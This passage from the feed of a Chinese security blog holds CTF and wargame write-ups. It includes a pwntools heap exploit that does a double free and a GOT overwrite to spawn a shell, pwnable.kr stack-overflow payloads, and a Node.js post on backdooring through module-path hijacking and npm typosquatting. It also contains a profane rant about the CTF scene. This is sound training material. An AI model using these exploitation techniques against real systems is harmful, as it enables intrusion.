class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;# Alloc 3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;for i in range(3):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    add_restaurant(&amp;quot;roadname&amp;quot;, &amp;quot;road&amp;quot;, i+1, &amp;quot;A&amp;quot;*100, i)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# overflow chunk 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload = &amp;quot;A&amp;quot; * 0x70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p32(0) + p32(0x71) + p32(0x804b0d0) + p32(0x804b0d4) + &amp;quot;A&amp;quot; * (0x70 - 0x10 - 0x8)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p32(0x68) + p32(0x70)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;edit_restaurant(0, 1, payload)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# double free&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;delete_restaurant(2)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# set chunk1&amp;apos;s desc addr to atoi@got&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;edit_restaurant(1, 1, &amp;quot;A&amp;quot; * 0xC + p32(0x804b048))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# edit atoi@got to system&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;edit_restaurant(1, 1, p32(0xf7e39b30))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# spawn /bin/sh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recvuntil(&amp;quot;Your choice: &amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.sendline(&amp;quot;/bin/sh&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recvuntil(&amp;quot;Your choice: &amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.interactive()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;ISG 2014 决赛上的一道题目，捡起来练练手。&lt;/p&gt;
&lt;h2 id=&quot;逆向分析&quot;&gt;&lt;a href=&quot;#逆向分析&quot; class=&quot;headerlink&quot; title=&quot;逆向分析&quot;&gt;&lt;/a&gt;逆向分析&lt;/h2&gt;&lt;p&gt;逆向一直是我的弱点，经验不足，过度依赖 F5，总体感觉还是汇编能力太弱了 ：（&lt;br&gt;我的 idb 文件在这里：&lt;a href=&quot;/images/2016/05/15/pepper.idb&quot;&gt;点击下载&lt;/a&gt;
    
    </summary>
    
      <category term="Exploit" scheme="http://sh3ll.me/categories/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>最近的一些吐嘈</title>
    <link href="http://sh3ll.me/2016/04/13/shit/"/>
    <id>http://sh3ll.me/2016/04/13/shit/</id>
    <published>2016-04-13T04:57:30.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;CTF 决赛现在也都开始找外援了么，什么时候开始这个圈子已经这样了？线上赛解不出，问问我还可以理解，什么时候决赛也开始这样了。打个比赛就是为了那点奖金么？为了打比赛而打比赛？不去了解是真的不知道有多脏。&lt;/p&gt;
&lt;p&gt;信安真的是『火』了，什么人都想插一脚。我们原本一个小协会只是想安静的做技术，在学校维护一个自己的圈子，现在到头来还要搞死我们？明面上说是为了我们好，实际想彻底栓住我，算盘打得也是响亮。这池水被搅的太浑了，社会人的做事真不是一群学生能抗衡的。&lt;/p&gt;
&lt;p&gt;草你们妈的。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;CTF 决赛现在也都开始找外援了么，什么时候开始这个圈子已经这样了？线上赛解不出，问问我还可以理解，什么时候决赛也开始这样了。打个比赛就是为了那点奖金么？为了打比赛而打比赛？不去了解是真的不知道有多脏。&lt;/p&gt;
&lt;p&gt;信安真的是『火』了，什么人都想插一脚。我们原本一个小协会
    
    </summary>
    
      <category term="Life" scheme="http://sh3ll.me/categories/Life/"/>
    
    
  </entry>
  
  <entry>
    <title>Learn Node.js</title>
    <link href="http://sh3ll.me/2016/04/06/learn-nodejs-portscan/"/>
    <id>http://sh3ll.me/2016/04/06/learn-nodejs-portscan/</id>
    <published>2016-04-06T07:26:46.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;这两天过了下《深入浅出Node.js》，记录下自己的理解。&lt;/p&gt;
&lt;h2 id=&quot;PortScan&quot;&gt;&lt;a href=&quot;#PortScan&quot; class=&quot;headerlink&quot; title=&quot;PortScan&quot;&gt;&lt;/a&gt;PortScan&lt;/h2&gt;&lt;p&gt;每次看一门语言都会去写个端口扫描器，其中可以学的到很多：模块编写/导入、网络 IO、并发控制、文件读写、命令行交互…&lt;br&gt;Node.js 版本的在：&lt;a href=&quot;https://gist.github.com/chuhades/bceb5a9d27ac7056081ea90639855cf6&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://gist.github.com/chuhades/bceb5a9d27ac7056081ea90639855cf6&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Node-js-的优劣&quot;&gt;&lt;a href=&quot;#Node-js-的优劣&quot; class=&quot;headerlink&quot; title=&quot;Node.js 的优劣&quot;&gt;&lt;/a&gt;Node.js 的优劣&lt;/h2&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;优点&quot;&gt;&lt;a href=&quot;#优点&quot; class=&quot;headerlink&quot; title=&quot;优点&quot;&gt;&lt;/a&gt;优点&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;事件驱动&lt;/li&gt;
&lt;li&gt;原生异步&lt;/li&gt;
&lt;li&gt;分布式&lt;/li&gt;
&lt;li&gt;生态圈繁荣&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因为这些优点，可以说 Node.js 就是为网络而生。借助 &lt;code&gt;events.EventEmitter&lt;/code&gt; 可以很简单的实现事件驱动，用来做扫描器效果应该很好；）&lt;br&gt;npm 的存在使 Node.js 的生态圈极其繁荣，各种 package 都很齐全，开发者只需要 require; require ~&lt;/p&gt;
&lt;h3 id=&quot;缺点&quot;&gt;&lt;a href=&quot;#缺点&quot; class=&quot;headerlink&quot; title=&quot;缺点&quot;&gt;&lt;/a&gt;缺点&lt;/h3&gt;&lt;p&gt;异步也带来了相应的缺点：callback hell。不过可以通过 &lt;code&gt;Promise/Deferred&lt;/code&gt; 模式解决，PortScan 中我使用了 &lt;code&gt;q&lt;/code&gt; 来做 Promise。&lt;/p&gt;
&lt;p&gt;所以 Node.js 的典型应用场景：I/O 密集型；分布式应用。&lt;br&gt;至于计算任务可以通过 C++ 编写 module 解决。&lt;/p&gt;
&lt;h2 id=&quot;可能的安全点&quot;&gt;&lt;a href=&quot;#可能的安全点&quot; class=&quot;headerlink&quot; title=&quot;可能的安全点&quot;&gt;&lt;/a&gt;可能的安全点&lt;/h2&gt;&lt;p&gt;除了常规问题，个人感觉可能出现问题的点如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;fake package&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Node.js 对应第三方包的导入流程如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;console.log(module.paths);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;// output&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;apos;/home/chu/Codz/learn_node/node_modules&amp;apos;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;apos;/home/chu/Codz/node_modules&amp;apos;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;apos;/home/chu/node_modules&amp;apos;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;apos;/home/node_modules&amp;apos;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;apos;/node_modules&amp;apos; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;]&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果当前目录没有相应包，则自动去上级目录寻找，并且优先级高于全局包。这可能会带来相应的安全点：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; ~/C/learn_node ls node_modules/                                                                        18:15:39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;bagpipe/  commander/  netmask/  q-io/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; ~/C/learn_node ls ../node_modules/                                                                     18:20:44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;q/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; ~/C/learn_node cat test.js                                                                             18:20:47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/**&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; * Created by chu on 16-4-6.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; */&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;var Q = require(&amp;quot;q&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; ~/C/learn_node node test.js                                                                            18:20:51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;faked package&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;// fake global&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;// 全局安装了 async&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; ~/C/learn_node ls node_modules/                                                                                                                                                                                            19:10:44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;async/  bagpipe/  commander/  netmask/  q-io/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; ~/C/learn_node cat test.js                                                                                                                                                                                                 19:10:45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/**&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; * Created by chu on 16-4-6.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; */&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;var async = require(&amp;quot;async&amp;quot;);                                                                                                                                                                                                       &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; ~/C/learn_node node test.js                                                                                                                                                                                                19:10:47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;faked package async&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以用来留后门；）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;npm 审核不严&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;npm 对用户提交缺乏审查机制，如果提交一个和知名包名字相近的包（Netmask -&amp;gt; netmask），用户错误输入就会导致安装恶意的包。造成代码执行。实例可以参考下：&lt;a href=&quot;http://www.cnblogs.com/index-html/p/npm_package_phishing.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;【社工】NodeJS 应用仓库钓鱼&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;References&quot;&gt;&lt;a href=&quot;#References&quot; class=&quot;headerlink&quot; title=&quot;References&quot;&gt;&lt;/a&gt;References&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;《深入浅出Node.js》&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/index-html/p/npm_package_phishing.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;【社工】NodeJS 应用仓库钓鱼&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;这两天过了下《深入浅出Node.js》，记录下自己的理解。&lt;/p&gt;
&lt;h2 id=&quot;PortScan&quot;&gt;&lt;a href=&quot;#PortScan&quot; class=&quot;headerlink&quot; title=&quot;PortScan&quot;&gt;&lt;/a&gt;PortScan&lt;/h2&gt;&lt;p&gt;每次看一门语言都会去写个端口扫描器，其中可以学的到很多：模块编写/导入、网络 IO、并发控制、文件读写、命令行交互…&lt;br&gt;Node.js 版本的在：&lt;a href=&quot;https://gist.github.com/chuhades/bceb5a9d27ac7056081ea90639855cf6&quot;&gt;https://gist.github.com/chuhades/bceb5a9d27ac7056081ea90639855cf6&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Node-js-的优劣&quot;&gt;&lt;a href=&quot;#Node-js-的优劣&quot; class=&quot;headerlink&quot; title=&quot;Node.js 的优劣&quot;&gt;&lt;/a&gt;Node.js 的优劣&lt;/h2&gt;
    
    </summary>
    
      <category term="Program" scheme="http://sh3ll.me/categories/Program/"/>
    
    
  </entry>
  
  <entry>
    <title>Pwnable.kr</title>
    <link href="http://sh3ll.me/2016/03/28/pwnable-kr-writeup/"/>
    <id>http://sh3ll.me/2016/03/28/pwnable-kr-writeup/</id>
    <published>2016-03-28T12:06:52.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;和糖果师傅学 Linux Exploit，发现 pwnable.kr 上面的题目很有趣，边学边做。&lt;/p&gt;
&lt;h2 id=&quot;1-fd&quot;&gt;&lt;a href=&quot;#1-fd&quot; class=&quot;headerlink&quot; title=&quot;1. fd&quot;&gt;&lt;/a&gt;1. fd&lt;/h2&gt;&lt;p&gt;考察的是 Linux 文件描述符相关知识：&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;fd == 0 为标准输入&lt;br&gt;fd == 1 为标准输出&lt;br&gt;fd == 2 为标准错误输出 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;将 argv[1] 减去 4660，read(fd)，然后比较字符串：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; ~/p/1_fd ./fd 4660                                                                                     05:14:13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LETMEWIN&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;good job :)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/bin/cat: flag: No such file or directory&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;2-collision&quot;&gt;&lt;a href=&quot;#2-collision&quot; class=&quot;headerlink&quot; title=&quot;2. collision&quot;&gt;&lt;/a&gt;2. collision&lt;/h2&gt;&lt;p&gt;IDA F5 给出的代码很清晰，输入5个数，和为 0x21DD09EC：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;.data:0804A020                 public hashcode&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:0804A020 hashcode        dd 21DD09ECh            ; DATA XREF: main+97r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if ( strlen(argv[1]) == 20 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      if ( check_password((int)argv[1]) == hashcode )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        system(&amp;quot;/bin/cat flag&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        result = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int __cdecl check_password(int a1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  signed int i; // [sp+4h] [bp-Ch]@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v3; // [sp+8h] [bp-8h]@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v3 = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  for ( i = 0; i &amp;lt;= 4; ++i )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v3 += *(_DWORD *)(a1 + 4 * i);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  return v3;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;3-bof&quot;&gt;&lt;a href=&quot;#3-bof&quot; class=&quot;headerlink&quot; title=&quot;3. bof&quot;&gt;&lt;/a&gt;3. bof&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;.text:00000649                 lea     eax, [ebp+s]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000064C                 mov     [esp], eax      ; s&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000064F                 call    gets&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00000654                 cmp     [ebp+arg_0], 0CAFEBABEh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000065B                 jnz     short loc_66B&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000065D                 mov     dword ptr [esp], offset command ; &amp;quot;/bin/sh&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00000664                 call    system&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00000669                 jmp     short loc_677&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;func&lt;/code&gt; 函数经典栈溢出，覆盖参数：”A” * (0x2C + 0x8) + pack(0x0CAFEBABE)&lt;/p&gt;
&lt;h2 id=&quot;4-flag&quot;&gt;&lt;a href=&quot;#4-flag&quot; class=&quot;headerlink&quot; title=&quot;4. flag&quot;&gt;&lt;/a&gt;4. flag&lt;/h2&gt;&lt;p&gt;&lt;code&gt;upx -d flag&lt;/code&gt; 脱掉壳，strings 就可以看到 flag：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; /tmp strings flag |grep -i upx                                                                         20:42:05&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;UPX...? sounds like a delivery service :)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;5-passcode&quot;&gt;&lt;a href=&quot;#5-passcode&quot; class=&quot;headerlink&quot; title=&quot;5. passcode&quot;&gt;&lt;/a&gt;5. passcode&lt;/h2&gt;&lt;p&gt;&lt;code&gt;scanf&lt;/code&gt; 未使用 &amp;amp; 传递指针，而是直接传递了变量，变量 &lt;code&gt;passcode1&lt;/code&gt; 未初始化，导致函数 &lt;code&gt;welcome&lt;/code&gt; 中的变量 &lt;code&gt;name（ebp-70h）&lt;/code&gt; 最后 4 字节刚好可以覆盖 &lt;code&gt;passcode1（ebp-10h）&lt;/code&gt;，造成任意地址的 4 字节写。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;.text:08048564 passcode1       = dword ptr -10h&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:08048564 passcode2       = dword ptr -0Ch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:08048564&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:08048564                 push    ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:08048565                 mov     ebp, esp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:08048567                 sub     esp, 28h&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0804856A                 mov     eax, offset format ; &amp;quot;enter passcode1 : &amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0804856F                 mov     [esp], eax      ; format&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:08048572                 call    _printf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:08048577                 mov     eax, offset aD  ; &amp;quot;%d&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0804857C                 mov     edx, [ebp+passcode1] ; scanf 忘记写 &amp;amp;，参数2为新申请的变量&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0804857C                                         ; 而新申请的变量未初始化，值为之前输入的 name&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0804857C                                         ; 导致任意地址写&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0804857F                 mov     [esp+4], edx&lt;/div&gt;&lt;div 